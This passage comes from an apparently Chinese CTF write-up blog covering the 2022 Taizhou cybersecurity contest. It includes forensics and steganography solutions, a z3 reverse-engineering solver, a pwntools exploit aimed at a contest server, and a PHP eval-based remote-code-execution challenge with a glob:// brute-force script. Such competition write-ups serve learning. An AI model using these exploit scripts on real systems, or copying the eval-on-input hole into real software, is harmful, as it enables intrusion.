Play&#x27;</span>)<br>game_window = pygame.display.set_mode((frame_size_x, frame_size_y))<br>black = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>white = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br>red = pygame.Color(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>green = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>)<br>blue = pygame.Color(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>fps_controller = pygame.time.Clock()<br>snake_pos = [<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">50</span>]<br>snake_body = [<br>    [<br>        <span class="hljs-number">100</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">90</span>,<br>        <span class="hljs-number">50</span>],<br>    [<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">50</span>]]<br>f_body = [<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">29</span>],<br>    [<br>        <span class="hljs-number">40</span>,<br>        <span class="hljs-number">30</span>],<br>    ...<br>    ...<br>    ...<br>    [<br>        <span class="hljs-number">624</span>,<br>        <span class="hljs-number">38</span>]]<br>food_pos = [<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>    random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>change_to = direction<br>score = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game_over</span>():<br>    OOOO000000O000OO0 = pygame.font.SysFont(<span class="hljs-string">&#x27;times new roman&#x27;</span>, <span class="hljs-number">90</span>)<br>    O000O0OO0OO0O0O0O = OOOO000000O000OO0.render(<span class="hljs-string">&#x27;YOU DIED&#x27;</span>, <span class="hljs-literal">True</span>, red)<br>    OOO00OO00O0O00O00 = O000O0OO0OO0O0O0O.get_rect()<br>    OOO00OO00O0O00O00.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">4</span>)<br>    game_window.fill(black)<br>    game_window.blit(O000O0OO0OO0O0O0O, OOO00OO00O0O00O00)<br>    show_score(<span class="hljs-number">0</span>, red, <span class="hljs-string">&#x27;times&#x27;</span>, <span class="hljs-number">20</span>)<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">3</span>)<br>    pygame.quit()<br>    sys.exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_score</span>(<span class="hljs-params">OO00000O0O000OO0O, O0O0O0OOOO000O000, O0O0000O00OO00OO0, O0O000OOOOOO00O0O</span>):<br>    O00O000000OO0O0OO = pygame.font.SysFont(O0O0000O00OO00OO0, O0O000OOOOOO00O0O)<br>    O0O0O0O0O0O00O00O = O00O000000OO0O0OO.render(<span class="hljs-string">&#x27;Score : &#x27;</span> + <span class="hljs-built_in">str</span>(score), <span class="hljs-literal">True</span>, O0O0O0OOOO000O000)<br>    O000O0OOOO000OO0O = O0O0O0O0O0O00O00O.get_rect()<br>    <span class="hljs-keyword">if</span> OO00000O0O000OO0O == <span class="hljs-number">1</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">10</span>, <span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">else</span>:<br>        O000O0OOOO000OO0O.midtop = (frame_size_x / <span class="hljs-number">2</span>, frame_size_y / <span class="hljs-number">1.25</span>)<br>    game_window.blit(O0O0O0O0O0O00O00O, O000O0OOOO000OO0O)<br><br><span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> pygame.event.get():<br>    <span class="hljs-keyword">if</span> event.<span class="hljs-built_in">type</span> == pygame.QUIT:<br>        pygame.quit()<br>        sys.exit()<br>    <span class="hljs-keyword">elif</span> event.<span class="hljs-built_in">type</span> == pygame.KEYDOWN:<br>        <span class="hljs-keyword">if</span> event.key == pygame.K_UP <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;w&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;UP&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_DOWN <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;s&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;DOWN&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_LEFT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;LEFT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_RIGHT <span class="hljs-keyword">or</span> event.key == <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;d&#x27;</span>):<br>            change_to = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br>        <span class="hljs-keyword">if</span> event.key == pygame.K_ESCAPE:<br>            pygame.event.post(pygame.event.Event(pygame.QUIT))<br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;UP&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;UP&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;DOWN&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;DOWN&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;LEFT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;LEFT&#x27;</span><br><span class="hljs-keyword">if</span> change_to == <span class="hljs-string">&#x27;RIGHT&#x27;</span> <span class="hljs-keyword">and</span> direction != <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    direction = <span class="hljs-string">&#x27;RIGHT&#x27;</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;UP&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;DOWN&#x27;</span>:<br>    snake_pos[<span class="hljs-number">1</span>] += <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;LEFT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] -= <span class="hljs-number">10</span><br><span class="hljs-keyword">if</span> direction == <span class="hljs-string">&#x27;RIGHT&#x27;</span>:<br>    snake_pos[<span class="hljs-number">0</span>] += <span class="hljs-number">10</span><br>snake_body.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">list</span>(snake_pos))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == food_pos[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == food_pos[<span class="hljs-number">1</span>]:<br>    score += <span class="hljs-number">1</span><br>    food_spawn = <span class="hljs-literal">False</span><br><span class="hljs-keyword">else</span>:<br>    snake_body.pop()<br><span class="hljs-keyword">if</span> score == <span class="hljs-number">1000</span>:<br>    game_window.fill(black)<br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> f_body:<br>        pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    pygame.display.flip()<br>    time.sleep(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> food_spawn:<br>    food_pos = [<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_x // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>,<br>        random.randrange(<span class="hljs-number">1</span>, frame_size_y // <span class="hljs-number">10</span>) * <span class="hljs-number">10</span>]<br>food_spawn = <span class="hljs-literal">True</span><br>game_window.fill(black)<br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> snake_body:<br>    pygame.draw.rect(game_window, green, pygame.Rect(pos[<span class="hljs-number">0</span>], pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br>pygame.draw.rect(game_window, white, pygame.Rect(food_pos[<span class="hljs-number">0</span>], food_pos[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>, <span class="hljs-number">10</span>))<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">0</span>] &gt; frame_size_x - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">1</span>] &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> snake_pos[<span class="hljs-number">1</span>] &gt; frame_size_y - <span class="hljs-number">10</span>:<br>    game_over()<br><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> snake_body[<span class="hljs-number">1</span>:]:<br>    <span class="hljs-keyword">if</span> snake_pos[<span class="hljs-number">0</span>] == block[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> snake_pos[<span class="hljs-number">1</span>] == block[<span class="hljs-number">1</span>]:<br>        game_over()<br>show_score(<span class="hljs-number">1</span>, white, <span class="hljs-string">&#x27;consolas&#x27;</span>, <span class="hljs-number">20</span>)<br>pygame.display.update()<br>fps_controller.tick(difficulty)<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>通过<code>f_body</code>变量中储存的坐标画图得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.new(<span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-number">1000</span>,<span class="hljs-number">1000</span>))<br>f_body=[...]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f_body:<br>    img.putpixel(<span class="hljs-built_in">tuple</span>(i),<span class="hljs-number">255</span>)<br>img.show()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-db-re2-1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Rank：13，被打爆了&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;md5-php&quot;&gt;&lt;a href=&quot;#md5-php&quot; class=&quot;header</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="强国杯" scheme="https://www.lewiserii.top/tags/%E5%BC%BA%E5%9B%BD%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2022台州市第二届网络安全大赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%8F%B0%E5%B7%9E%E5%B8%82%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</id>
    <published>2022-09-28T06:00:00.000Z</published>
    <updated>2022-11-26T05:41:14.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="bitlocker"><a href="#bitlocker" class="headerlink" title="bitlocker"></a>bitlocker</h3><p>内存取证，在内存镜像中搜索<code>txt</code>文件，得到<code>BitLocker</code>恢复密钥</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-1-1.png"></p><p>导出后得到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">BitLocker 驱动器加密恢复密钥<br><br>恢复密钥用于恢复 BitLocker 保护的驱动器上的数据。<br><br>若要验证该密码是否为正确的恢复密码，请将这些标记与恢复屏幕上显示的标记进行比较。<br><br>恢复密钥标记: 118D5B0A-0C1F-4F<br>完整恢复密钥标记: 118D5B0A-0C1F-4F76-A3B7-01658D566145<br><br>BitLocker 恢复密钥:<br>432696-262691-480018-407649-083578-365651-065142-713999<br></code></pre></td></tr></table></figure><p>在windows7虚拟机上挂载<code>bitlocker.vmdk</code>，使用恢复密钥<code>432696-262691-480018-407649-083578-365651-065142-713999</code>解锁，拿到<code>flag</code>文件</p><p>文件开头为<code>42 4d</code>，判断是bmp文件，但是文件头被修改了</p><p>删掉文件头和文件尾，文件长度除以4后为<code>39949</code>，因式分解得到<code>7*13*439</code>，所以宽高是<code>439*91</code></p><p>用python生成一个宽为439，高为91的rgba格式的bmp文件，和原文件比较，还原文件头，得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-1-2.png"></p><h3 id="皇帝的flag"><a href="#皇帝的flag" class="headerlink" title="皇帝的flag"></a>皇帝的flag</h3><p>crc报错，修改高度，得到二维码，扫码得到<code>‌‌‌‌‍‬‍‍‌‌‌‌‍‌﻿‍‌‌‌‌‍﻿‌‌只有聪明的人才能得到‌‌‌‌‌﻿‌﻿‌‌‌‌‍﻿‌‬flag‌‌‌‌‌﻿‌‌‌‌‌‌‍‍‌‬‌‌‌‌‍‍﻿﻿哦‌‌‌‌‍﻿‌‌‌‌‌‌‍‍‍﻿‌‌‌‌‍‌‍‌</code></p><p>在010中看到很多不可见字符，0宽得到密码<code>eMp3r0R_pWD</code></p><p>stegsolve分析，存在lsb隐写</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-misc-3-1.png"></p><h3 id="列文虎克的秘密"><a href="#列文虎克的秘密" class="headerlink" title="列文虎克的秘密"></a>列文虎克的秘密</h3><p>这是什么题呀，太离谱了，十位密码爆破。100分简单题到结束才三血</p><p><em>赛后复现</em></p><p>先修复<code>zip</code>头，改成<code>50 4B 03 04</code>，然后进行十位数字爆破，得到<code>874375984</code></p><p>图片尾看到<code>oursecret</code>特征块，密码是图片上的列文虎克名字<code>LeEuw3nh0ek</code></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="EzMath1"><a href="#EzMath1" class="headerlink" title="EzMath1"></a>EzMath1</h3><p>先脱upx壳，在<code>TlsCallback_1</code>函数中找到程序实际用于检测的代码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-1.png"></p><p><code>sub_401210</code>函数检测输入的前7个字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-2.png"></p><p><code>sub_401670</code>函数检测其余输入的字符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-3.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v21=Int(<span class="hljs-string">&#x27;v21&#x27;</span>)<br>v22=Int(<span class="hljs-string">&#x27;v22&#x27;</span>)<br>v23=Int(<span class="hljs-string">&#x27;v23&#x27;</span>)<br>v24=Int(<span class="hljs-string">&#x27;v24&#x27;</span>)<br>v31=Int(<span class="hljs-string">&#x27;v31&#x27;</span>)<br>v32=Int(<span class="hljs-string">&#x27;v32&#x27;</span>)<br>v33=Int(<span class="hljs-string">&#x27;v33&#x27;</span>)<br>s=Solver()<br>s.add(<span class="hljs-number">65</span>*v33+<span class="hljs-number">24</span>*v32+<span class="hljs-number">118</span>*v31+<span class="hljs-number">126</span>*v24+<span class="hljs-number">173</span>*v23+<span class="hljs-number">179</span>*v22+<span class="hljs-number">195</span>*v21==<span class="hljs-number">0xFE5F</span>)<br>s.add(<span class="hljs-number">277</span>*v33+<span class="hljs-number">236</span>*v32+<span class="hljs-number">433</span>*v31+<span class="hljs-number">484</span>*v24+<span class="hljs-number">228</span>*v23+<span class="hljs-number">142</span>*v22+<span class="hljs-number">261</span>*v21==<span class="hljs-number">0x28113</span>)<br>s.add(<span class="hljs-number">496</span>*v33+<span class="hljs-number">309</span>*v32+<span class="hljs-number">46</span>*v31+<span class="hljs-number">135</span>*v24+<span class="hljs-number">165</span>*v23+<span class="hljs-number">7</span>*v22+<span class="hljs-number">495</span>*v21==<span class="hljs-number">152196</span>)<br>s.add(<span class="hljs-number">236</span>*v33+<span class="hljs-number">250</span>*v32+<span class="hljs-number">41</span>*v31+<span class="hljs-number">247</span>*v24+<span class="hljs-number">67</span>*v23+<span class="hljs-number">251</span>*v22+<span class="hljs-number">471</span>*v21==<span class="hljs-number">0x1EFA4</span>)<br>s.add(<span class="hljs-number">457</span>*v33+<span class="hljs-number">414</span>*v32+<span class="hljs-number">271</span>*v31+<span class="hljs-number">32</span>*v24+<span class="hljs-number">244</span>*v23+<span class="hljs-number">74</span>*v22+<span class="hljs-number">113</span>*v21==<span class="hljs-number">0x24273</span>)<br>s.add(<span class="hljs-number">221</span>*v33+<span class="hljs-number">76</span>*v32+<span class="hljs-number">263</span>*v31+<span class="hljs-number">363</span>*v24+<span class="hljs-number">49</span>*v23+<span class="hljs-number">82</span>*v22+<span class="hljs-number">405</span>*v21==<span class="hljs-number">0x1B1AA</span>)<br>s.check()<br>a=<span class="hljs-string">&quot;Yqc77YD8jc&#x27;&#x27;&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br>r=s.model()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[v21 = 71,</span><br><span class="hljs-string"> v22 = 48,</span><br><span class="hljs-string"> v23 = 100,</span><br><span class="hljs-string"> v24 = 77,</span><br><span class="hljs-string"> v31 = 52,</span><br><span class="hljs-string"> v32 = 116,</span><br><span class="hljs-string"> v33 = 104]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>r=[<span class="hljs-number">71</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">77</span>, <span class="hljs-number">52</span>, <span class="hljs-number">116</span>, <span class="hljs-number">104</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> r:<br>    e=e+<span class="hljs-built_in">chr</span>(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e=e+<span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)^<span class="hljs-number">7</span>))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-reverse1-4.png"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="reader"><a href="#reader" class="headerlink" title="reader"></a>reader</h3><p>利用<code>edit</code>中的偏移 向<code>0x4260</code>处写入<code>0x200</code>个字符，可以覆盖<code>stream</code>和<code>filename</code>变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">off,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendafter(<span class="hljs-string">&#x27;data: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;Exit&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./reader&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;22385&#x27;</span>)<br><span class="hljs-built_in">open</span>()<br>read()<br><span class="hljs-comment">#gdb.attach(p,&#x27;b open&#x27;)</span><br>edit(<span class="hljs-number">0x200</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&quot;./flag\x00&quot;</span>)<br><span class="hljs-built_in">open</span>()<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-pwn-1-1.png"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="TryGetPasswd"><a href="#TryGetPasswd" class="headerlink" title="TryGetPasswd"></a>TryGetPasswd</h3><p><em>赛后复现</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$passwd</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-comment"># passwd 的格式为 [a-zA-z0-9]&#123;10&#125;</span><br><span class="hljs-variable">$hintfile</span> = <span class="hljs-string">&quot;/tmp/hint&quot;</span>.<span class="hljs-variable">$passwd</span>;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;touch <span class="hljs-subst">$hintfile</span>&quot;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">foreach</span> ((<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>])) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getSize</span>().<span class="hljs-string">&quot;\n&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;passwd&quot;</span>]===<span class="hljs-variable">$passwd</span>)&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>获取到<code>passwd</code>后可以<code>rce</code>，而<code>DirectoryIterator</code>可以列目录，它的参数支持<code>glob://</code>伪协议，当存在文件时<code>$file-&gt;getSize()有回显</code>回显，这样就可以通过脚本遍历获取到<code>passwd</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://80.endpoint-ab681a0db3214901a65a00b23c616372.dasc.buuoj.cn:81/?passwd=123&amp;dir=glob:///tmp/hint&quot;</span><br>b=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>data=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> b:<br>        r=requests.get(url+data+j+<span class="hljs-string">&#x27;*&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            data=data+j<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-1-1.png"></p><p>拿到passwd：<code>st1sOFAblF</code>，进行rce</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-1-2.png"></p><h3 id="ezGadget01"><a href="#ezGadget01" class="headerlink" title="ezGadget01"></a>ezGadget01</h3><p><em>赛后复现</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 